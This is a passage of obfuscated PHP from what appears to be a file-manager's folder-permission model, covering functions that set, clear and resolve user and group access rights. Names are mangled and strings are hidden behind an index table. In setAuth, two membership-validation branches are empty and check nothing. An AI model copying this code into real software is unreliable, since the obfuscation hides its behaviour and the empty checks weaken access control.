$ÎŠ§…¤ = array(); $ºí—øÏ = is_array($Å¦ éµ«) ? !1 : !0; if ($ºí—øÏ) { $Å¦ éµ« = array($Å¦ éµ«); } $Š…ØŞ…ò = array(); foreach ($Å¦ éµ« as $¤¤úëÅÁ) { if (isset($ÎŠ§…¤[$¤¤úëÅÁ])) { $Š…ØŞ…ò[$¤¤úëÅÁ] = $ÎŠ§…¤[$¤¤úëÅÁ]; } } if (count($Š…ØŞ…ò) == count($Å¦ éµ«)) { return $ºí—øÏ ? $Š…ØŞ…ò[$Å¦ éµ«[0]] : $Š…ØŞ…ò; } $¸¹ùÑ»ñ = $’Ñó½»Ä[1980]; $¨äË’³Ù = array($’Ñó½»Ä[403] => array($’Ñó½»Ä[17], $Å¦ éµ«)); $°û˜‘ç = $this->field($¸¹ùÑ»ñ)->order($’Ñó½»Ä[401])->where($¨äË’³Ù)->select(); $şŞ˜ö… = array_to_keyvalue_group($°û˜‘ç, $’Ñó½»Ä[403]); foreach ($Å¦ éµ« as $¤¤úëÅÁ) { $ÎŠ§…¤[$¤¤úëÅÁ] = $şŞ˜ö…[$¤¤úëÅÁ] ? $şŞ˜ö…[$¤¤úëÅÁ] : array(); } if ($ºí—øÏ) { return $°û˜‘ç; } return $şŞ˜ö…; } public function setAuth($§ïüç·±, $ìêƒÚò) { $ÊØÇåıÁ =& $_SERVER[¹àö™Ç¾]; $¤âæğæ = Model($ÊØÇåıÁ[1310])->sourceInfo($§ïüç·±); if (!$¤âæğæ) { return !1; } if ($¤âæğæ[$ÊØÇåıÁ[412]] != SourceModel::TYPE_GROUP) { return !1; } $ñÈŸêÎµ = 1; $¾–öÖ¢¸ = $¤âæğæ[$ÊØÇåıÁ[504]]; if ($¾–öÖ¢¸ != $ñÈŸêÎµ) { $â•ôÍƒ¬ = array($ÊØÇåıÁ[1808] => $¾–öÖ¢¸); $ñ©‘ãØ¡ = Model($ÊØÇåıÁ[1897])->field($ÊØÇåıÁ[1640])->where($â•ôÍƒ¬)->select(); $ñ©‘ãØ¡ = array_to_keyvalue($ñ©‘ãØ¡, $ÊØÇåıÁ[22], $ÊØÇåıÁ[1640]); } $ìÑà²¹¡ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÈãÉà¸ = array(); foreach ($ìêƒÚò as $Ìô‚ô´) { if (!in_array($Ìô‚ô´[$ÊØÇåıÁ[412]], $ìÑà²¹¡)) { show_json(LNG($ÊØÇåıÁ[1981]), !1); } if ($¾–öÖ¢¸ != $ñÈŸêÎµ) { if ($Ìô‚ô´[$ÊØÇåıÁ[412]] == SourceModel::TYPE_GROUP) { } if ($Ìô‚ô´[$ÊØÇåıÁ[504]] != 0 && !in_array($Ìô‚ô´[$ÊØÇåıÁ[504]], $ñ©‘ãØ¡)) { } } if ($Ìô‚ô´[$ÊØÇåıÁ[504]] == 0) { $Ìô‚ô´[$ÊØÇåıÁ[412]] = SourceModel::TYPE_USER; } $ÈãÉà¸[] = array($ÊØÇåıÁ[403] => $§ïüç·±, $ÊØÇåıÁ[412] => intval($Ìô‚ô´[$ÊØÇåıÁ[412]]), $ÊØÇåıÁ[504] => intval($Ìô‚ô´[$ÊØÇåıÁ[504]]), $ÊØÇåıÁ[1909] => intval($Ìô‚ô´[$ÊØÇåıÁ[1909]]) ? intval($Ìô‚ô´[$ÊØÇåıÁ[1909]]) : 0, $ÊØÇåıÁ[1963] => intval($Ìô‚ô´[$ÊØÇåıÁ[1963]]) ? intval($Ìô‚ô´[$ÊØÇåıÁ[1963]]) : -1); } $this->where(array($ÊØÇåıÁ[418] => $§ïüç·±))->delete(); $this->addAll($ÈãÉà¸); return !0; } public function authClear($ÑŠ·‡È¡) { $òùÒ˜¿˜ =& $_SERVER[¹àö™Ç¾]; $ªºŒçÕ = Model($òùÒ˜¿˜[1310])->sourceInfo($ÑŠ·‡È¡); $İÁ¹£à˜ = array($ÑŠ·‡È¡); if ($ªºŒçÕ[$òùÒ˜¿˜[411]] == $òùÒ˜¿˜[99]) { $ÂéŠ¼ŒŸ = array($òùÒ˜¿˜[584] => array($òùÒ˜¿˜[544], $ªºŒçÕ[$òùÒ˜¿˜[521]] . $ÑŠ·‡È¡ . $òùÒ˜¿˜[545])); $İÁ¹£à˜ = Model($òùÒ˜¿˜[1310])->field($òùÒ˜¿˜[418])->where($ÂéŠ¼ŒŸ)->getField($òùÒ˜¿˜[403], !0); $İÁ¹£à˜[] = $ÑŠ·‡È¡; } $this->where(array($òùÒ˜¿˜[418] => array($òùÒ˜¿˜[419], $İÁ¹£à˜)))->delete(); return !0; } public function getAllChildren($Å˜¡É¢) { $ÈÛÂ¸ö =& $_SERVER[¹àö™Ç¾]; $„¾ß®Á˜ = Model($ÈÛÂ¸ö[1310])->sourceInfo($Å˜¡É¢); if ($„¾ß®Á˜[$ÈÛÂ¸ö[411]] != $ÈÛÂ¸ö[99]) { return $this->sourceListAuth(array($Å˜¡É¢)); } if ($„¾ß®Á˜[$ÈÛÂ¸ö[412]] != SourceModel::TYPE_GROUP) { return array(); } $†›úúæ = 1; $Õ¹¾­ß± = array($Å˜¡É¢); if ($„¾ß®Á˜[$ÈÛÂ¸ö[498]] == $ÈÛÂ¸ö[200] && $„¾ß®Á˜[$ÈÛÂ¸ö[504]] != $†›úúæ) { $Õ¹¾­ß± = $this->groupChidldAllRootSource($„¾ß®Á˜[$ÈÛÂ¸ö[504]]); } $Ÿ×©¦Æí = $this->field($ÈÛÂ¸ö[403])->group($ÈÛÂ¸ö[403])->select(); $Ÿ×©¦Æí = array_to_keyvalue($Ÿ×©¦Æí, $ÈÛÂ¸ö[22], $ÈÛÂ¸ö[403]); if (!$Ÿ×©¦Æí) { return array(); } $š¨°œÚ± = $ÈÛÂ¸ö[1982]; $°‚Öî¬ = array($ÈÛÂ¸ö[403] => array($ÈÛÂ¸ö[17], $Ÿ×©¦Æí), $ÈÛÂ¸ö[431] => $ÈÛÂ¸ö[200]); $†¢•ß±ë = Model($ÈÛÂ¸ö[817])->field($š¨°œÚ±)->where($°‚Öî¬)->select(); $ºœ‰¹â‚ = array($Å˜¡É¢); foreach ($†¢•ß±ë as $Ê¢âĞù“) { foreach ($Õ¹¾­ß± as $«ÒàˆëÍ) { $Ã´œœçé = $ÈÛÂ¸ö[60] . $«ÒàˆëÍ . $ÈÛÂ¸ö[60]; $»İğüïï = $Ê¢âĞù“[$ÈÛÂ¸ö[521]] . $Ê¢âĞù“[$ÈÛÂ¸ö[403]] . $ÈÛÂ¸ö[60]; if (strstr($»İğüïï, $Ã´œœçé)) { $ºœ‰¹â‚[] = $Ê¢âĞù“[$ÈÛÂ¸ö[403]]; break; } } } return $this->sourceListAuth($ºœ‰¹â‚); } private function sourceListAuth($ÀËÂÍ”) { $«Àü¡ŠÌ =& $_SERVER[¹àö™Ç¾]; $Œìöí¶» = Model($«Àü¡ŠÌ[1310])->sourceListInfo($ÀËÂÍ”, !0); $¹›±ü“ = $this->sourceAuthSelect($ÀËÂÍ”); $¬¤ª«ş× = array(); $œ¿°š­¾ = array(); foreach ($Œìöí¶» as $Š½¦Â¼›) { unset($Š½¦Â¼›[$«Àü¡ŠÌ[454]]); unset($Š½¦Â¼›[$«Àü¡ŠÌ[452]]); unset($Š½¦Â¼›[$«Àü¡ŠÌ[414]]); unset($Š½¦Â¼›[$«Àü¡ŠÌ[97]]); $ÉôÎŞ¿× = $¹›±ü“[$Š½¦Â¼›[$«Àü¡ŠÌ[403]]]; if (!$ÉôÎŞ¿×) { continue; } $Š½¦Â¼›[$«Àü¡ŠÌ[1983]] = $this->authTargetInfo($ÉôÎŞ¿×); $Š½¦Â¼›[$«Àü¡ŠÌ[519]] = rtrim($Š½¦Â¼›[$«Àü¡ŠÌ[525]], $«Àü¡ŠÌ[18]) . $«Àü¡ŠÌ[18] . ltrim($Š½¦Â¼›[$«Àü¡ŠÌ[519]], $«Àü¡ŠÌ[18]); $¬¤ª«ş×[] = $Š½¦Â¼›; $§Å„ğˆ³ = count(explode($«Àü¡ŠÌ[18], trim($Š½¦Â¼›[$«Àü¡ŠÌ[519]], $«Àü¡ŠÌ[18]))); $œ¿°š­¾[] = $§Å„ğˆ³ + ($Š½¦Â¼›[$«Àü¡ŠÌ[43]] == $«Àü¡ŠÌ[89] ? 0 : 1000); } array_multisort($œ¿°š­¾, SORT_ASC, $¬¤ª«ş×); return $¬¤ª«ş×; } private function groupChidldAllRootSource($†¾ÁûÍ) { $…‹‡Ç¿Ù =& $_SERVER[¹àö™Ç¾]; $ã—ÓÓÙÉ = Model($…‹‡Ç¿Ù[1984])->groupChildrenAll($†¾ÁûÍ); $¹£Öœ¿ö = array($…‹‡Ç¿Ù[498] => 0, $…‹‡Ç¿Ù[504] => array($…‹‡Ç¿Ù[17], $ã—ÓÓÙÉ), $…‹‡Ç¿Ù[412] => SourceModel::TYPE_GROUP); $ªğıš²¾ = Model($…‹‡Ç¿Ù[817])->field($…‹‡Ç¿Ù[403])->where($¹£Öœ¿ö)->select(); $ªğıš²¾ = array_to_keyvalue($ªğıš²¾, $…‹‡Ç¿Ù[22], $…‹‡Ç¿Ù[403]); return $ªğıš²¾; } private function authTargetInfo($°èô‘†¼) { $ÁÓœˆ´« =& $_SERVER[¹àö™Ç¾]; $ó…ŠĞ„ = array(); $¾ıÛšÃ‡ = array(); $€‚­‚– = 2 << 25; foreach ($°èô‘†¼ as $„ô½ò·Æ) { $à¾¾ßŞã = Model($ÁÓœˆ´«[507])->listData($„ô½ò·Æ[$ÁÓœˆ´«[1909]]); if (!$à¾¾ßŞã) { continue; } if ($„ô½ò·Æ[$ÁÓœˆ´«[412]] == SourceModel::TYPE_USER) { $€·óí¼ = Model($ÁÓœˆ´«[513])->getInfoSimpleOuter($„ô½ò·Æ[$ÁÓœˆ´«[504]]); if ($€·óí¼[$ÁÓœˆ´«[1640]] == $ÁÓœˆ´«[1173]) { continue; } if ($€·óí¼[$ÁÓœˆ´«[1640]] == $ÁÓœˆ´«[200]) { $€·óí¼[$ÁÓœˆ´«[42]] = LNG($ÁÓœˆ´«[1985]); } } else { $€·óí¼ = Model($ÁÓœˆ´«[522])->getInfoSimple($„ô½ò·Æ[$ÁÓœˆ´«[504]]); } if (!$€·óí¼) { continue; } $€·óí¼[$ÁÓœˆ´«[466]] = $à¾¾ßŞã; $ó…ŠĞ„[] = $€·óí¼; $á»”î³È = 0; if ($„ô½ò·Æ[$ÁÓœˆ´«[412]] == SourceModel::TYPE_GROUP) { $á»”î³È = $€‚­‚– * 2; } if ($„ô½ò·Æ[$ÁÓœˆ´«[412]] == SourceModel::TYPE_USER) { $á»”î³È = $€‚­‚–; } if ($„ô½ò·Æ[$ÁÓœˆ´«[412]] == SourceModel::TYPE_USER && $„ô½ò·Æ[$ÁÓœˆ´«[504]] == $ÁÓœˆ´«[200]) { $á»”î³È = 0; } $¾ıÛšÃ‡[] = $à¾¾ßŞã[$ÁÓœˆ´«[414]] + $á»”î³È; } array_multisort($¾ıÛšÃ‡, SORT_DESC, $ó…ŠĞ„); return $ó…ŠĞ„; } public function getAllChildrenByUser($šÏÓ÷Û€, $¡ƒÅÇ™) { $ÚÂÏ§•„ =& $_SERVER[¹àö™Ç¾]; $ã«°ÏŠÍ = Model($ÚÂÏ§•„[538])->getInfo($¡ƒÅÇ™); if (!$¡ƒÅÇ™ || !$šÏÓ÷Û€ || !$ã«°ÏŠÍ) { return array(); } $ãï›¿« = Model($ÚÂÏ§•„[1310])->sourceInfo($šÏÓ÷Û€); $Ê”ĞÄõÛ = array(); $œı®· = 1; if ($ãï›¿«[$ÚÂÏ§•„[498]] == $ÚÂÏ§•„[200] && $ãï›¿«[$ÚÂÏ§•„[504]] != $œı®· && $this->groupContainUser($ãï›¿«[$ÚÂÏ§•„[504]], $¡ƒÅÇ™)) { foreach ($ã«°ÏŠÍ[$ÚÂÏ§•„[1986]] as $æ‹«ö¼–) { $¬å¡ŞÂ = Model($ÚÂÏ§•„[522])->getInfo($æ‹«ö¼–[$ÚÂÏ§•„[1808]]); $æ›‚‚±Û = Model($ÚÂÏ§•„[538])->getInfoSimpleOuter($¡ƒÅÇ™); $æ›‚‚±Û[$ÚÂÏ§•„[466]] = $æ‹«ö¼–[$ÚÂÏ§•„[414]]; if (Model($ÚÂÏ§•„[507])->authCheckAction($æ‹«ö¼–[$ÚÂÏ§•„[414]][$ÚÂÏ§•„[414]], $ÚÂÏ§•„[1828])) { continue; } $‘Ì½à¦é = array($ÚÂÏ§•„[42] => $ÚÂÏ§•„[1589] . $¬å¡ŞÂ[$ÚÂÏ§•„[42]], $ÚÂÏ§•„[403] => $¬å¡ŞÂ[$ÚÂÏ§•„[97]][$ÚÂÏ§•„[403]], $ÚÂÏ§•„[88] => KodIO::make($¬å¡ŞÂ[$ÚÂÏ§•„[97]][$ÚÂÏ§•„[403]]), $ÚÂÏ§•„[498] => $ÚÂÏ§•„[200], $ÚÂÏ§•„[412] => $ÚÂÏ§•„[515], $ÚÂÏ§•„[43] => $ÚÂÏ§•„[548], $ÚÂÏ§•„[519] => $¬å¡ŞÂ[$ÚÂÏ§•„[526]], $ÚÂÏ§•„[1808] => $¬å¡ŞÂ[$ÚÂÏ§•„[1808]], $ÚÂÏ§•„[523] => $¬å¡ŞÂ[$ÚÂÏ§•„[498]], $ÚÂÏ§•„[1983] => array($æ›‚‚±Û)); $Ê”ĞÄõÛ[$‘Ì½à¦é[$ÚÂÏ§•„[403]]] = $‘Ì½à¦é; } } $¯ëˆ‚ê¯ = array(); $ßè³½Ì¤ = $this->getAllChildren($šÏÓ÷Û€); foreach ($ßè³½Ì¤ as $÷Éû‚ï÷) { $¤ïÔ“‹ç = !1; foreach ($÷Éû‚ï÷[$ÚÂÏ§•„[1983]] as $ñù±åÊª) { if ($ñù±åÊª[$ÚÂÏ§•„[1640]]) { if ($ñù±åÊª[$ÚÂÏ§•„[1640]] == $¡ƒÅÇ™) { $¤ïÔ“‹ç = !0; break; } } if ($ñù±åÊª[$ÚÂÏ§•„[1808]]) { if ($this->groupContainUser($ñù±åÊª[$ÚÂÏ§•„[1808]], $¡ƒÅÇ™)) { $¤ïÔ“‹ç = !0; break; } } } if ($¤ïÔ“‹ç) { $¯ëˆ‚ê¯[] = $÷Éû‚ï÷; } $…–çëˆ = $÷Éû‚ï÷[$ÚÂÏ§•„[403]]; if (isset($Ê”ĞÄõÛ[$…–çëˆ])) { $÷Éû‚ï÷[$ÚÂÏ§•„[1983]][] = $Ê”ĞÄõÛ[$…–çëˆ][0]; $Ê”ĞÄõÛ[$…–çëˆ] = !1; } } $Ê”ĞÄõÛ = array_filter(array_values($Ê”ĞÄõÛ)); $¯ëˆ‚ê¯ = array_merge($Ê”ĞÄõÛ, $¯ëˆ‚ê¯); return $¯ëˆ‚ê¯; } public function setAllChildrenByUser($·õ²ÎÔ¿, $Öô´˜, $Ø„Ì„§Æ) { $—»œ¨Ò =& $_SERVER[¹àö™Ç¾]; $„†ñ²–˜ = $this->getAllChildrenByUser($·õ²ÎÔ¿, $Öô´˜); if (!$Ø„Ì„§Æ || !$„†ñ²–˜) { return !1; } foreach ($„†ñ²–˜ as $¯êİàâ) { $çôÃ¥ãí = array(); foreach ($¯êİàâ[$—»œ¨Ò[1983]] as $áÁ¬½Ğü) { $¡ü²½ÛÜ = $áÁ¬½Ğü[$—»œ¨Ò[466]]; $ì¾ÈˆÈ = $áÁ¬½Ğü[$—»œ¨Ò[1640]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ëÀµÏü› = $áÁ¬½Ğü[$—»œ¨Ò[1640]] ? $áÁ¬½Ğü[$—»œ¨Ò[1640]] : $áÁ¬½Ğü[$—»œ¨Ò[1808]]; if ($áÁ¬½Ğü[$—»œ¨Ò[1640]] && $áÁ¬½Ğü[$—»œ¨Ò[1640]] == $Öô´˜) { continue; } $çôÃ¥ãí[] = array($—»œ¨Ò[403] => $¯êİàâ[$—»œ¨Ò[403]], $—»œ¨Ò[412] => $ì¾ÈˆÈ, $—»œ¨Ò[504] => intval($ëÀµÏü›), $—»œ¨Ò[1909] => isset($¡ü²½ÛÜ[$—»œ¨Ò[401]]) ? intval($¡ü²½ÛÜ[$—»œ¨Ò[401]]) : 0, $—»œ¨Ò[1963] => isset($¡ü²½ÛÜ[$—»œ¨Ò[1963]]) ? intval($¡ü²½ÛÜ[$—»œ¨Ò[1963]]) : -1); } $çôÃ¥ãí[] = array($—»œ¨Ò[403] => $¯êİàâ[$—»œ¨Ò[403]], $—»œ¨Ò[412] => SourceModel::TYPE_USER, $—»œ¨Ò[504] => intval($Öô´˜), $—»œ¨Ò[1909] => intval($Ø„Ì„§Æ), $—»œ¨Ò[1963] => -1); $this->where(array($—»œ¨Ò[418] => $¯êİàâ[$—»œ¨Ò[403]]))->delete(); $this->addAll($çôÃ¥ãí); } return !0; } public function get($¹¼¸Ö£¼) { $¨¢ãä¶Í = $this->getSourceList(array($¹¼¸Ö£¼), !0); return $¨¢ãä¶Í[0]; } public function getSourceList($Õéƒ²Ó™, $î¯Ï»ú” = false, $„ÈÀæ¾Â = false) { $®Ó·ü€Ú =& $_SERVER[¹àö™Ç¾]; if (!$Õéƒ²Ó™) { return array(); } $£¥­†µê = Model($®Ó·ü€Ú[1310]); if (!$î¯Ï»ú” && count($Õéƒ²Ó™) == 1) { $î¯Ï»ú” = array(); $î¯Ï»ú”[$Õéƒ²Ó™[0]] = $£¥­†µê->sourceInfo($Õéƒ²Ó™[0]); } if (!$î¯Ï»ú”) { $Şá¹ğ¶Ï = array($®Ó·ü€Ú[418] => array($®Ó·ü€Ú[419], $Õéƒ²Ó™)); $î¯Ï»ú” = $£¥­†µê->field($®Ó·ü€Ú[1987])->where($Şá¹ğ¶Ï)->select(); $î¯Ï»ú” = array_to_keyvalue($î¯Ï»ú”, $®Ó·ü€Ú[403]); } $€˜Ş°ã´ = $Õéƒ²Ó™; foreach ($î¯Ï»ú” as $™Ø«Â«ƒ => $¢ûËƒ»Œ) { $¿ÌÎ—‡» = $£¥­†µê->parentLevelArray($¢ûËƒ»Œ[$®Ó·ü€Ú[521]]); $€˜Ş°ã´ = array_merge($€˜Ş°ã´, array($™Ø«Â«ƒ), array_reverse($¿ÌÎ—‡»)); } $€˜Ş°ã´ = array_values(array_unique($€˜Ş°ã´)); if (!$€˜Ş°ã´) { return array(); } $×éš…ó– = $this->sourceAuthSelect($€˜Ş°ã´); $èñéÙİÓ = array(); foreach ($€˜Ş°ã´ as $º•±Ğ§) { if (isset($×éš…ó–[$º•±Ğ§])) { $èñéÙİÓ[$º•±Ğ§] = $×éš…ó–[$º•±Ğ§]; } } $‡§Ëşšæ = $this->userIsRoot($„ÈÀæ¾Â); $è¢§÷¥À = AuthModel::authAll(); $ÜãŞ…Ü” = array($®Ó·ü€Ú[415] => $è¢§÷¥À, $®Ó·ü€Ú[1988] => array($®Ó·ü€Ú[420] => 0, $®Ó·ü€Ú[1814] => $è¢§÷¥À, $®Ó·ü€Ú[421] => LNG($®Ó·ü€Ú[1989]), $®Ó·ü€Ú[1830] => $®Ó·ü€Ú[1990])); $£ìˆğ¢Ä = array(); foreach ($î¯Ï»ú” as $º•±Ğ§ => $ãˆ‘ Ùß) { if ($‡§Ëşšæ) { $£ìˆğ¢Ä[$º•±Ğ§] = $ÜãŞ…Ü”; continue; } $£ìˆğ¢Ä[$º•±Ğ§] = $this->makeSourceAuth($ãˆ‘ Ùß, $èñéÙİÓ, $„ÈÀæ¾Â); } return $£ìˆğ¢Ä; } public function authDeepCheck($­Š¸Ã®è, $Ç·‘– — = false) { $èƒ«÷±‡ =& $_SERVER[¹àö™Ç¾]; $Ç·‘– — = $Ç·‘– — ? $Ç·‘– — : USER_ID; $³÷“šÚæ = $this->makeAuthDeep($Ç·‘– —); if (!in_array($­Š¸Ã®è, $³÷“šÚæ[$èƒ«÷±‡[1991]])) { return !1; } $âŠœâ®Â = array(); foreach ($³÷“šÚæ[$èƒ«÷±‡[1992]] as $ôş€Œìä => $Ç¢óåŞ¹) { if (!in_array($­Š¸Ã®è, $Ç¢óåŞ¹)) { continue; } $âŠœâ®Â[] = $ôş€Œìä; } if (!$âŠœâ®Â) { return !1; } $¾œ¨¿æÙ = $âŠœâ®Â ? $âŠœâ®Â[0] : $­Š¸Ã®è; return array($èƒ«÷±‡[415] => -1, $èƒ«÷±‡[466] => array($èƒ«÷±‡[420] => $èƒ«÷±‡[1173], $èƒ«÷±‡[1814] => $èƒ«÷±‡[200], $èƒ«÷±‡[421] => LNG($èƒ«÷±‡[1993]), $èƒ«÷±‡[1830] => $èƒ«÷±‡[1994]), $èƒ«÷±‡[1995] => LNG($èƒ«÷±‡[1996]), $èƒ«÷±‡[1997] => $this->sourceAuthInfo($¾œ¨¿æÙ)); } protected function makeAuthDeep($ƒ¯‹õµ = false) { $«±ø¤úª =& $_SERVER[¹àö™Ç¾]; static $æìŞ­Ùœ = array(); $ƒ¯‹õµ = $ƒ¯‹õµ ? $ƒ¯‹õµ : USER_ID; if (isset($æìŞ­Ùœ[$ƒ¯‹õµ])) { return $æìŞ­Ùœ[$ƒ¯‹õµ]; } $±¢‘ª¤ = Model($«±ø¤úª[1998])->listData(); $Ÿ¹¹¦Ìö = array(); foreach ($±¢‘ª¤ as $ê®÷ù¯Ô) { if ($ê®÷ù¯Ô[$«±ø¤úª[414]] == 0 && $ê®÷ù¯Ô[$«±ø¤úª[1829]] == $«±ø¤úª[99]) { $Ÿ¹¹¦Ìö[] = $ê®÷ù¯Ô[$«±ø¤úª[401]]; } } $ÛñşÒ = $this->userGroupParents($ƒ¯‹õµ); $¶‘™‡Ü = array($«±ø¤úª[412] => SourceModel::TYPE_USER, $«±ø¤úª[504] => $ƒ¯‹õµ); if ($ÛñşÒ) { $¶‘™‡Ü = array(array($«±ø¤úª[412] => SourceModel::TYPE_USER, $«±ø¤úª[504] => $ƒ¯‹õµ), array($«±ø¤úª[412] => SourceModel::TYPE_GROUP, $«±ø¤úª[504] => array($«±ø¤úª[419], $ÛñşÒ)), $«±ø¤úª[985] => $«±ø¤úª[1903]); } $­Ù¯É¢÷ = $this->field($«±ø¤úª[1999])->where($¶‘™‡Ü)->select(); $ü„›™™ = array(); $²«ÑÜì¢ = array_to_keyvalue_group($­Ù¯É¢÷, $«±ø¤úª[403]); foreach ($²«ÑÜì¢ as $óºğ¼ü => $üîŠñÈÒ) { $ï†Û©ğœ = $this->authArrayCheck($üîŠñÈÒ, $ƒ¯‹õµ); if ($ï†Û©ğœ[$«±ø¤úª[415]] > 0) { $ü„›™™[] = $óºğ¼ü . $«±ø¤úª[22]; } } if ($ÛñşÒ) { $¯¶®Šƒ = Model($«±ø¤úª[522]); foreach ($ÛñşÒ as $Ëçòîû«) { $ß•úÂ“ = $¯¶®Šƒ->getInfo($Ëçòîû«); if (!$ß•úÂ“ || !is_array($ß•úÂ“[$«±ø¤úª[97]])) { continue; } $ü„›™™[] = $ß•úÂ“[$«±ø¤úª[97]][$«±ø¤úª[403]]; } } $ÅÁó›ö = array(); $ßïàá°— = $ÛñşÒ; $±ÛÜ¿û = Model($«±ø¤úª[1310]); $¯¶®Šƒ = Model($«±ø¤úª[522]); $¿«ıç‘Œ = array(); $‡½¬Ñš” = array(); $‘øµİ¸ƒ = array(); $Û²ıÒş = array(); if ($ü„›™™) { $¹Œ›¡Û£ = $±ÛÜ¿û->where(array($«±ø¤úª[403] => array($«±ø¤úª[419], $ü„›™™)))->select(); foreach ($¹Œ›¡Û£ as $§´‡üÜ‚) { $´ùÇøà± = $±ÛÜ¿û->parentLevelArray($§´‡üÜ‚[$«±ø¤úª[521]]); $ÅÁó›ö = array_merge($ÅÁó›ö, $´ùÇøà±); $ßïàá°—[] = $§´‡üÜ‚[$«±ø¤úª[504]]; $¿«ıç‘Œ[$§´‡üÜ‚[$«±ø¤úª[403]]] = $´ùÇøà±; $‡½¬Ñš”[$§´‡üÜ‚[$«±ø¤úª[403]]] = $§´‡üÜ‚[$«±ø¤úª[504]]; } } $ßïàá°— = array_values(array_unique($ßïàá°—)); $¥¸ÔÔ­Ë = $ßïàá°—; foreach ($¥¸ÔÔ­Ë as $Ëçòîû«) { $ß•úÂ“ = $¯¶®Šƒ->getInfo($Ëçòîû«); $´ùÇøà± = $±ÛÜ¿û->parentLevelArray($ß•úÂ“[$«±ø¤úª[521]]); $ßïàá°— = array_merge($ßïàá°—, $´ùÇøà±); } $ßïàá°— = array_values(array_unique($ßïàá°—)); foreach ($ßïàá°— as $Ëçòîû«) { $ß•úÂ“ = $¯¶®Šƒ->getInfo($Ëçòîû«); $ÅÁó›ö[] = $ß•úÂ“[$«±ø¤úª[97]][$«±ø¤úª[403]]; $‘øµİ¸ƒ[$Ëçòîû«] = $ß•úÂ“[$«±ø¤úª[97]][$«±ø¤úª[403]]; $Û²ıÒş[$Ëçòîû«] = $±ÛÜ¿û->parentLevelArray($ß•úÂ“[$«±ø¤úª[521]]); } foreach ($¿«ıç‘Œ as $ŠóÁè‰ğ => $Û•Ì·ŞÜ) { $€ãÎ¹ú = $‡½¬Ñš”[$ŠóÁè‰ğ]; if (!$€ãÎ¹ú || !$‘øµİ¸ƒ[$€ãÎ¹ú]) { continue; } $å ş‚ÆÎ = array(); foreach ($Û²ıÒş[$€ãÎ¹ú] as $Ëçòîû«) { $å ş‚ÆÎ[] = $‘øµİ¸ƒ[$Ëçòîû«]; } $¿«ıç‘Œ[$ŠóÁè‰ğ] = array_merge($å ş‚ÆÎ, $Û•Ì·ŞÜ); } $ÅÁó›ö = array_values(array_unique($ÅÁó›ö)); $×ù²‚“Á = array($«±ø¤úª[1991] => $ÅÁó›ö, $«±ø¤úª[1992] => $¿«ıç‘Œ); $æìŞ­Ùœ[$ƒ¯‹õµ] = $×ù²‚“Á; return $×ù²‚“Á; } private function makeSourceAuth($„ğëäï½, $ˆå¬Êùî, $Îˆ˜âÙæ = false) { $±¤ºÑÕÆ =& $_SERVER[¹àö™Ç¾]; $å¿…ûàé = $±¤ºÑÕÆ[99]; $Æ—æğ¾ = $„ğëäï½[$±¤ºÑÕÆ[504]]; $òô¼æÎİ = $„ğëäï½[$±¤ºÑÕÆ[412]] == SourceModel::TYPE_GROUP; $ß‰±³ô› = $òô¼æÎİ ? $this->groupRootAuth($Æ—æğ¾, $Îˆ˜âÙæ) : !1; if ($ß‰±³ô› && Model($±¤ºÑÕÆ[507])->authCheckAction($ß‰±³ô›[$±¤ºÑÕÆ[414]], $±¤ºÑÕÆ[1828])) { return $this->groupAuthInfo($ß‰±³ô›, $Æ—æğ¾); } $ÄÒ¬çØø = Model($±¤ºÑÕÆ[1310])->parentLevelArray($„ğëäï½[$±¤ºÑÕÆ[521]]); $ÄÒ¬çØø = array_merge(array($„ğëäï½[$±¤ºÑÕÆ[403]]), array_reverse($ÄÒ¬çØø)); $‘àşÃµé = !1; foreach ($ÄÒ¬çØø as $šĞ÷áŸÚ) { if (!isset($ˆå¬Êùî[$šĞ÷áŸÚ])) { continue; } $€¶™Ìê§ = $this->authMake($ˆå¬Êùî[$šĞ÷áŸÚ], $Îˆ˜âÙæ); if ($€¶™Ìê§[$±¤ºÑÕÆ[466]]) { $‘àşÃµé = $€¶™Ìê§; break; } } if (!$òô¼æÎİ) { return $‘àşÃµé; } if (!$‘àşÃµé && $ß‰±³ô›) { $‘àşÃµé = $this->groupAuthInfo($ß‰±³ô›, $Æ—æğ¾); } if (!$‘àşÃµé) { $÷àƒÈù’ = Model($±¤ºÑÕÆ[522])->getInfo($Æ—æğ¾); $Š÷£÷‘ = explode($±¤ºÑÕÆ[60], trim($÷àƒÈù’[$±¤ºÑÕÆ[521]], $±¤ºÑÕÆ[60])); $Š÷£÷‘ = array_reverse($Š÷£÷‘); foreach ($Š÷£÷‘ as $„°ŠÕœ) { if ($„°ŠÕœ == $±¤ºÑÕÆ[200] || $„°ŠÕœ == $å¿…ûàé) { continue; } $šşÜ¿× = $this->groupRootAuth($„°ŠÕœ, $Îˆ˜âÙæ); if (!$šşÜ¿×) { continue; } $‘àşÃµé = $this->groupAuthInfo($šşÜ¿×, $„°ŠÕœ); break; } } if (!$‘àşÃµé || $‘àşÃµé[$±¤ºÑÕÆ[415]] <= 0) { $³ïÌÚŸ¶ = $this->authDeepCheck($„ğëäï½[$±¤ºÑÕÆ[403]], $Îˆ˜âÙæ); if ($³ïÌÚŸ¶) { $‘àşÃµé = $³ïÌÚŸ¶; } } return $‘àşÃµé; } private function userIsRoot($å¶ˆß¬ô = false) { $öğôŸ‘Ö =& $_SERVER[¹àö™Ç¾]; if (!$å¶ˆß¬ô && _get($GLOBALS, $öğôŸ‘Ö[505])) { return !0; } $‚ÛÙäµ = Model($öğôŸ‘Ö[538])->getInfo($å¶ˆß¬ô); $ŠÊ©ËöÖ = Model($öğôŸ‘Ö[2000])->listData($‚ÛÙäµ[$öğôŸ‘Ö[1520]]); if ($ŠÊ©ËöÖ && $ŠÊ©ËöÖ[$öğôŸ‘Ö[511]][$öğôŸ‘Ö[2001]] == 1) { return !0; } return !1; } private function sourceAuthInfo($î§°×Ã¨) { $Â±Ğ…æ =& $_SERVER[¹àö™Ç¾]; $½äÂô·ã = Model($Â±Ğ…æ[1310]); $ï¤Ä¤¨¿ = $½äÂô·ã->sourceInfo($î§°×Ã¨); if (!$ï¤Ä¤¨¿) { return !1; } $½äÂô·ã->groupPathDisplay($ï¤Ä¤¨¿); $¥éù¸Ñ = array($ï¤Ä¤¨¿); $¥éù¸Ñ = $½äÂô·ã->_listAppendPath($¥éù¸Ñ); $ï¤Ä¤¨¿ = $¥éù¸Ñ[0]; $êóûîï‡ = $ï¤Ä¤¨¿[$Â±Ğ…æ[519]]; if (isset($ï¤Ä¤¨¿[$Â±Ğ…æ[527]])) 